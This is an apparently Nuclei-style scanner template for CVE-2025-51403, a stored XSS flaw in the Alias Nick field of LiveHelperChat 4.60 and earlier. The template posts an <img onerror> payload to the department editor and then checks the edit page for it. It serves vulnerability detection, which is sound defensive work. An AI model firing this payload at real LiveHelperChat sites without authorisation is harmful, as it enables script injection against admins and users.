info:
  name: "LiveHelperChat Stored XSS in Edit Department"
  author: "beginee"
  severity: high
  description: |
    Stored XSS via the Alias Nick field in the department assignment module of LiveHelperChat (versions <= 4.60).
    CVE: CVE-2025-51403
    CWE: CWE-79
    CPE: cpe:2.3:a:livehelperchat:livehelperchat:4.60:*:*:*:*:*:*:*
    CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
    EPSS Score: 0.00031, Percentile: 0.0
  reference:
    - "https://github.com/Thewhiteevil/CVE-2025-51403"
    - "https://github.com/LiveHelperChat/livehelperchat/pull/2228/commits/2056503ad96e04467ec9af8d827109b9b9b46223"
  tags: ["cve", "xss", "livehelperchat"]
requests:
  - method: POST
    path:
      - "{{BaseURL}}/index.php/site_admin/user/newdepartment/1/(editor)/self"
    headers:
      Cookie: "{{cookie}}"
      Content-Type: application/x-www-form-urlencoded
    body: "alias_nick=<img src=x onerror=prompt(document.domain)>"
    matchers:
      - type: regex
        name: xss-detected
        regex:
          - '<img\s+src="x"\s+onerror="prompt\(document\.domain\);"'
  - method: GET
    path:
      - "{{BaseURL}}/index.php/site_admin/user/editdepartment/1/1"
    headers:
      Cookie: "{{cookie}}"
    matchers:
      - type: regex
        name: xss-detected
        regex:
          - '<img\s+src="x"\s+onerror="prompt\(document\.domain\);"'
